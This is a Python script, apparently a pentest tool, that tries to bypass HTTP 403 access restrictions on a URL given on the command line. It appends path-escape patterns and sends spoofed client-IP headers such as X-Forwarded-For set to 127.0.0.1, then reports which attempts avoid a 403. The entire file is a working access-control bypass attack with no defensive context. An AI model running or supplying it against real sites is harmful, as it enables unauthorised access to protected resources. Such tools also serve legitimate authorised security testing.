


import requests
import random
import sys
from concurrent import futures

# randomip=".".join(map(str, (random.randint(0, 255) for _ in range(4))))

color = ["\033[97m","\033[92m"]

url = sys.argv[1]
head = {} # custom http request header
IP = "127.0.0.1"

escapes = ["/*","/%2f/","/./","/","/*/"]

headers_value = [
     {"X-Custom-IP-Authorization":IP},
     {"X-Forwarded-For":IP},
     {"X-Forward-For":IP},
     {"X-Remote-IP":IP},
     {"X-Originating-IP":IP},
     {"X-Remote-Addr":IP},
     {"X-Client-IP":IP},
     {"X-Real-IP":IP}
]


def req_escape(u,pattern):
    mixed = u+pattern
    req = requests.get(mixed,headers=head)
    if req.status_code != 403:
       print(f"[+] status code: {color[1]}{req.status_code}{color[0]}, url: {req.url}")
    else:
       print(f"[+] status code: {color[0]}{req.status_code}{color[0]}, url: {req.url}")


def req_header(u,header):
    head[list(header)[0]] = header[list(header)[0]]
    xw = f"{list(header)[0]}:{header[list(header)[0]]}"
    req = requests.get(u,headers=head)
    if req.status_code != 403:
       print(f"[+] status code: {color[1]}{req.status_code}{color[0]}, header: {xw}")
    else:
       print(f"[+] status code: {color[0]}{req.status_code}{color[0]}, header: {xw}")


def main():
    print("[*] trying make request with special characters\n")
    with futures.ProcessPoolExecutor(max_workers=10) as t:
       results = [t.submit(req_escape,url,pattern) for pattern in escapes]
       for see in results:
           if see.result():
              print(see.result())

    print("\n[*] trying make request with new header\n")
    with futures.ProcessPoolExecutor(max_workers=10) as t:
       results = [t.submit(req_header,url,head) for head in headers_value]
       for see in results:
           if see.result():
              print(see.result())




if __name__=="__main__":
   main()
